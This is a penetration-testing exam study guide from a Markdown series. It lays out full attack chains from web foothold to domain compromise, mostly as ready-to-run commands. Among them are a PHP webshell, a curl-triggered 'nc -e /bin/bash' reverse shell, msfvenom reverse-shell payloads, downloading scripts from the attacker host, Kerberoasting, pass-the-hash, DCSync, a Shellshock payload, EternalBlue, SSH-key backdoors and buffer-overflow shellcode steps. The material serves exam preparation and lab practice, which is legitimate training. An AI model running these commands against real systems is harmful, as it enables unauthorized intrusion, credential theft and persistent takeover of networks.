# 16 - CTF AND EXAM SCENARIOS

**Credits**  
Zeeshan  
GitHub: https://github.com/mzeeshanzafar28  
LinkedIn: https://www.linkedin.com/in/mzeeshanzafar28  

The CPENT exam is not a collection of standalone boxes — it is a segmented network. Every flag you capture depends on chaining vulnerabilities across subnets. This file shows you exactly how to think when you land on a host and what to do next.

---

## 1. THE CORE CHAINING MINDSET

Before every action, hold these rules:

- **Every new shell = immediate recon.** Run `ip a` / `ipconfig /all` before you do anything else.
- **Dual-homed = pivot.** A host with two interfaces is your gateway into the next subnet.
- **Document in real time.** You cannot go back after the clock stops.
- **Stabilize before you move.** Upgrade to Meterpreter, add SSH keys, or create a persistent callback.
- **When stuck, re-enumerate.** The next path is usually already visible in data you collected earlier.

---

## 2. THE CLASSIC FULL CHAIN: WEB → PIVOT → INTERNAL → DOMAIN CONTROLLER

This is the most common high-value path in the exam. Master it.

### Phase 1: External Web Foothold

Port scan the public-facing target:
```bash
nmap -sS -Pn -p- --min-rate 1000 <TARGET_IP>
```

Look for:
- HTTP/HTTPS (80, 443, 8080, 8443)
- WordPress sites (run `wpscan --url http://TARGET`)
- Custom web applications with upload forms
- Directory traversal in URL parameters
- SQL injection points (test with single quote)
- Exposed admin panels (/admin, /wp-admin, /manager)

**Gain a reverse shell:**
```bash
# PHP reverse shell (upload via file upload vuln)
msfvenom -p php/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.php

# Or use a webshell + nc
# Upload cmd.php: <?php system($_GET['cmd']); ?>
curl "http://TARGET/uploads/cmd.php?cmd=nc+-e+/bin/bash+YOUR_IP+4444"
```

### Phase 2: Immediate Post-Exploitation

The moment you get a shell, run these before anything else:

**Linux:**
```bash
id
ip a
ip route
arp -a
cat /etc/hosts
cat /etc/passwd
find / -type f -name "*.txt" 2>/dev/null | head -20
find / -type f -name "*.conf" 2>/dev/null | head -20
sudo -l 2>/dev/null
```

**Windows:**
```cmd
whoami
whoami /priv
whoami /groups
ipconfig /all
route print
arp -a
net user
net localgroup administrators
type C:\Windows\System32\drivers\etc\hosts
```

### Phase 3: Establish the Pivot

If you see a second interface (e.g., `172.16.20.10/24`), you must pivot. Options in order of preference:

**Option A: Chisel (Reverse SOCKS) — Most Reliable**
```bash
# On your Kali (server):
./chisel server -p 8000 --reverse

# On the compromised host (client):
./chisel client YOUR_KALI_IP:8000 R:1080:socks
```

**Option B: SSH Dynamic Forward (if you have creds or can add your key)**
```bash
# Add your SSH key on the target:
echo "ssh-rsa AAA... you@kali" >> ~/.ssh/authorized_keys

# From Kali:
ssh -D 1080 -N -f user@TARGET_IP
```

**Option C: Meterpreter Autoroute + SOCKS**
```bash
# In Meterpreter session:
run post/multi/manage/autoroute SUBNET=172.16.20.0/24
run autoroute -p    # Verify the route
# Background the session, then:
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```

**Test the tunnel immediately:**
```bash
proxychains nmap -sT -Pn -p 445,3389,80,22 172.16.20.0/24
```
> **CRITICAL:** Through proxychains, only `-sT` (TCP connect) scans work. Never use `-sS` (SYN).

### Phase 4: Internal Enumeration

Once inside the internal subnet:

```bash
# Discover Windows hosts
proxychains crackmapexec smb 172.16.20.0/24

# Check SMB null sessions
proxychains crackmapexec smb 172.16.20.X -u '' -p '' --shares

# LDAP enumeration
proxychains ldapsearch -x -H ldap://172.16.20.X -b "DC=domain,DC=local"

# If you get any domain credentials, run BloodHound
proxychains bloodhound-python -c All -u USER -p PASS -d DOMAIN.local -dc 172.16.20.X -ns 172.16.20.X
```

### Phase 5: Lateral Movement to Domain Compromise

```bash
# Kerberoasting
proxychains impacket-GetUserSPNs -request -dc-ip 172.16.20.X DOMAIN/user:password
# Crack the TGS hash:
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (if Kerberos pre-auth is disabled)
proxychains impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip 172.16.20.X

# Pass-the-Hash (if you have NTLM hashes)
proxychains evil-winrm -i 172.16.20.X -u Administrator -H <NTLM_HASH>

# DCSync once you have Domain Admin
proxychains impacket-secretsdump DOMAIN/Administrator@172.16.20.X
```

### Phase 6: Flag Collection

- DC: `C:\Users\Administrator\Desktop\flag.txt`
- Member servers: `C:\Users\*\Desktop\flag.txt`
- Linux hosts: `/root/flag.txt`, `/home/*/flag.txt`

---

## 3. WORKED EXAMPLE WITH PLACEHOLDER IPs

```
Attacker Kali          : 10.10.14.5
Web Server (Pivot-1)  : 10.10.10.20 (eth0: public, eth1: 172.16.20.20)
Internal Windows       : 172.16.20.30
Domain Controller      : 172.16.20.5
```

**Step-by-step command log:**

```bash
# 1. External scan
nmap -sS -Pn -p- 10.10.10.20
# → Ports 22, 80, 443 open

# 2. Web enumeration
gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/dirb/common.txt
# → /upload/ directory found, allows .php files

# 3. Upload reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > rev.php
curl -F "file=@rev.php" http://10.10.10.20/upload/
nc -lvnp 4444
curl http://10.10.10.20/upload/rev.php
# → Shell received as www-data

# 4. Immediate recon on shell
id
ip a
# → eth1: 172.16.20.20/24 — SECOND INTERFACE FOUND

# 5. Privilege escalation
wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh
bash /tmp/linpeas.sh
# → SUID on /usr/bin/find
find . -exec /bin/sh -p \; -quit
# → Root

# 6. Set up pivot
# On Kali:
./chisel server -p 8000 --reverse
# On target:
./chisel client 10.10.14.5:8000 R:1080:socks &

# 7. Test and scan internal
proxychains nmap -sT -Pn -p 445,3389,88,389 172.16.20.0/24
# → 172.16.20.5 (DC), 172.16.20.30 (file server)

# 8. Enumerate domain
proxychains crackmapexec smb 172.16.20.5 -u 'guest' -p '' --shares
# → Found readable share: \\DC\Shared

proxychains smbclient //172.16.20.5/Shared -U guest
# dir, recurse on, prompt off, mget *
# → Found Groups.xml with cpassword

# 9. Decrypt GPP credentials
gpp-decrypt <cpassword_value>
# → svc_backup:Password123!

# 10. BloodHound collection
proxychains bloodhound-python -c All -u svc_backup -p 'Password123!' -d CORP.local -dc 172.16.20.5 -ns 172.16.20.5

# 11. Kerberoast
proxychains impacket-GetUserSPNs -request -dc-ip 172.16.20.5 CORP.local/svc_backup:'Password123!'
hashcat -m 13100 kerb_hash.txt rockyou.txt
# → Administrator:Summer2024!

# 12. Domain Admin shell
proxychains evil-winrm -i 172.16.20.5 -u Administrator -p 'Summer2024!'
# → FLAG CAPTURED
```

---

## 4. SECOND PATTERN: EXPOSED SERVICE → LINUX PRIVESC → SSH PIVOT

This pattern appears when the first foothold is NOT a web server but an exposed service.

1. External scan reveals SSH (22), FTP (21), or a custom service with default/weak credentials.
2. Land as low-privilege user.
3. Run LinPEAS. Escalate via: SUID binaries (GTFOBins), sudo misconfigurations, writable cron jobs, capabilities, or kernel exploits.
4. Once root, add your SSH key for stable access.
5. Discover additional interfaces.
6. Pivot: `ssh -D 1080 -N root@TARGET` or ProxyJump: `ssh -J user@pivot target_inside`.

---

## 5. DOUBLE PIVOT (SUBNET-TO-SUBNET)

```
Attacker → Segment-A-Pivot → Segment-B-Pivot → Final-Targets
```

**Stacking proxies:**
Edit `/etc/proxychains.conf` and ensure `dynamic_chain` is uncommented:
```
dynamic_chain
[ProxyList]
socks4 127.0.0.1 1080    # First SOCKS (into Segment A)
socks4 127.0.0.1 1081    # Second SOCKS (into Segment B)
```

**Or use SSH ProxyJump chaining:**
```bash
ssh -J user@pivot1 user@pivot2
```

**Double Chisel example:**
```bash
# Pivot 1: Kali ← Chisel → Pivot-1 (port 1080)
# Pivot 2: inside Segment A, route through port 1080
proxychains ./chisel client 10.10.14.5:8000 R:1081:socks &
# Now port 1081 tunnels into Segment B
```

---

## 6. SCENARIO-BASED DECISION TREES

### SCENARIO: The Silent Perimeter (Firewall Blocking Everything)

**Situation:** `nmap -sS TARGET` returns 0 open ports. Host appears down.

**Decision Tree:**
1. Verify host liveness: `nmap -PR -sn TARGET` (ARP, same subnet only) or `nmap -PS80,443 -PA80,443 -sn TARGET` (TCP SYN/ACK pings).
2. If alive: Throttle scan: `nmap -T2 TARGET`.
3. Fragment packets: `nmap -sS -f --mtu 24 TARGET`.
4. Source port spoofing (firewalls often trust DNS/HTTP ports): `nmap --source-port 53 TARGET` or `nmap --source-port 80 TARGET`.
5. ICMP timestamp/address mask: `nmap -PP TARGET` or `nmap -PM TARGET`.
6. Manual service probing: Use netcat on common ports: `nc -nv TARGET 80`, `nc -nv TARGET 443`.

### SCENARIO: Web Shell Obtained → Found Second Interface

**Situation:** You have `www-data` on a web server. `ip a` shows `172.16.20.20/24`.

**Decision Tree:**
1. **Immediately escalate to root** (LinPEAS → find SUID/sudo/cron/kernel exploit).
2. **Establish pivot** (Chisel reverse SOCKS preferred).
3. **Test tunnel:** `proxychains nmap -sT -Pn -p 445 172.16.20.0/24`.
4. **Identify targets:** SMB shares, DC (ports 88, 389, 445), web servers.
5. **Enumerate domain** with any credentials you find on the pivot host.
6. **Loot credentials** from the pivot host before moving on.

### SCENARIO: Active Directory Black Hole (No Credentials, No SMB Shares)

**Situation:** You reached the internal network. SMB null sessions return nothing. No credentials anywhere.

**Decision Tree:**
1. **IPv6 poisoning:** Run `mitm6` + `ntlmrelayx.py` or `Responder` to capture hashes from machines looking for network resources.
2. **LLMNR/NBT-NS poisoning:** `sudo responder -I tun0` (or your pivoted interface).
3. **Search other machines:** Sometimes developer workstations have open shares with hardcoded credentials.
4. **Password spray common passwords:** `crackmapexec smb 172.16.20.0/24 -u users.txt -p 'Password123'`.
5. **AS-REP roasting:** `impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP` (no credentials needed for users without Kerberos pre-auth).
6. **Once you have ONE user:** Run SharpHound/BloodHound immediately.

### SCENARIO: Custom Binary with No Public Exploit

**Situation:** You find an open port running a custom application. Searchsploit returns nothing. You download the binary.

**Decision Tree:**
1. **Static analysis:** `file binary`, `strings binary`, `rabin2 -I binary`, `rabin2 -z binary`.
2. **Fuzz the application:** Write a Python script sending increasing buffer sizes.
3. **Identify crash offset:** Use Metasploit's `pattern_create.rb` and `pattern_offset.rb`.
4. **Find JMP ESP / CALL EAX gadget:** `ropper -f binary --search "jmp esp"` (avoid addresses with `\x00`).
5. **Generate shellcode:** `msfvenom -p windows/shell_reverse_tcp LHOST=YOU LPORT=4444 -f python -b '\x00'`.
6. **Construct payload:** `PADDING + JMP_ESP_ADDRESS + NOP_SLED + SHELLCODE`.
7. **If the exploit fails twice, reset the target machine.** Services crash frequently.

### SCENARIO: The Fragile SCADA/OT Network

**Situation:** You pivoted into the OT segment. You suspect Modbus (port 502).

**Decision Tree:**
1. **DO NOT run aggressive scans.** No Nessus, no `-A`, no `-O`, no `-sV`. Use `-T2` at most.
2. **Passive discovery:** Wireshark filter `tcp.port == 502` to find master/slave IPs.
3. **Safe active scan:** `nmap -n -sT -p 502 --open 10.X.X.0/24`.
4. **Find Unit ID:** `nmap --script=modbus-discover.nse -p 502 TARGET` or Metasploit `auxiliary/scanner/scada/modbus_findunitid`.
5. **Read registers:** Metasploit `auxiliary/scanner/scada/modbusclient` or `modbus-cli`.
6. **Capture traffic for evidence:** `tcpdump -i eth0 -w scada.pcap port 502`, analyze in Wireshark.

---

## 7. IoT/BINARY AS ENTRY POINT

### IoT Firmware Attack Chain
1. **Get firmware:** Download from vendor site, extract from device via UART, or capture OTA update.
2. **Analyze:** `binwalk -e firmware.bin`, then explore `_firmware.bin.extracted/`.
3. **Look for:** Hardcoded credentials in config files, command injection in CGI scripts, weak update mechanisms.
4. **Emulate:** Use firmadyne or QEMU to run the firmware.
5. **Exploit:** Get shell on the emulated device, then reproduce against live target.
6. **Pivot:** Many IoT devices sit on both user and management networks — check interfaces immediately.

### Binary Exploitation as Entry Point
1. Crash the service, control EIP/RIP, execute shellcode.
2. Land on the host running the vulnerable binary.
3. **Check interfaces and pivot** — same as any other foothold.
4. Treat the binary as just another door. Once you're in, follow the same post-exploitation workflow.

---

## 8. LEGACY & SHELLSHOCK-STYLE VULNS (Quick Hits)

These appear frequently in exam environments. Check for them early:

```bash
# Shellshock (CVE-2014-6271) — CGI scripts
curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://TARGET/cgi-bin/test.cgi

# Heartbleed (CVE-2014-0160) — OpenSSL
nmap --script ssl-heartbleed -p 443 TARGET
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS TARGET; run"

# EternalBlue (MS17-010) — SMBv1
nmap --script smb-vuln-ms17-010 -p 445 TARGET
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; run"

# BlueKeep (CVE-2019-0708) — RDP
nmap --script rdp-vuln-ms12-020 -p 3389 TARGET
```

---

## 9. FILE DISCOVERY PATTERNS (What to search on every host)

**Linux:**
```bash
# Credentials
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" \) 2>/dev/null
grep -rn "password" /var/www/ 2>/dev/null
grep -rn "DB_PASS" /var/www/ 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null

# Sensitive files
find / -name "*.sql" -o -name "*.db" -o -name "*.sqlite" 2>/dev/null
find / -name ".bash_history" -o -name ".mysql_history" 2>/dev/null
```

**Windows:**
```cmd
dir /s /b C:\*.xml C:\*.config C:\*.ini C:\*.txt
findstr /s /i "password" C:\*.txt C:\*.xml C:\*.config
findstr /s /i "connectionstring" C:\*.config
dir /s /b C:\Groups.xml C:\*.kdbx C:\*.rdp
```

---

## 10. COMMON EXAM OBJECTIVES BY RANGE

| Range | Primary Objective | Key Skill |
|-------|------------------|-----------|
| Web/IoT | Get shell, discover second interface, pivot | Chaining web exploits to pivoting |
| Active Directory | Reach Domain Admin, perform DCSync | BloodHound + Impacket + lateral movement |
| Binary | Exploit buffer overflow, get shell | EIP control + shellcode generation |
| OT/SCADA | Read Modbus registers, capture evidence | Passive recon + safe scanning |
| Wireless | Capture handshake, crack WPA key | Aircrack-ng suite |
| Pivoting | Navigate multi-segment network | Chisel/SSH/proxychains mastery |

---

## 11. HOST DOCUMENTATION TEMPLATE

For every compromised host, fill this out immediately:

```
Host IP / Hostname:
Interfaces and routes:
How access was obtained:
Privilege level:
Credentials / hashes / tickets found:
Local findings (flags, sensitive files):
Next pivot possibilities (reachable subnets):
Screenshots taken:
```

---

## 12. PRACTICE LABS

Build this exact setup and practice until it feels automatic:

```
Kali → Dual-Homed Linux (Pivot-1) → Internal Windows → Domain Controller
```

- **TryHackMe:** Wreath, PivotAPI, Attacktive Directory, Corporate
- **HackTheBox Pro Labs:** Dante, Zephyr (or retired pivoting machines)
- **Self-built:** Three VMs on segmented virtual networks

**Goal:** Go from external web foothold to Domain Admin on a multi-segment network in 3-4 hours with clean notes.

---

## 13. EMERGENCY RECOVERY

If you lose a shell or tunnel:
1. **Re-exploit** the same vulnerability (you already know it works).
2. **Use alternate access** if you left a backdoor (SSH key, scheduled task, second listener).
3. **Restart pivoting** from scratch — Chisel and SSH are fast to set up.

If an exploit crashes the target and it becomes unresponsive:
1. **Reset the machine** (if allowed).
2. Re-exploit and be more careful with payload parameters.

---

**End of 16-CTF-AND-EXAM-SCENARIOS.md**
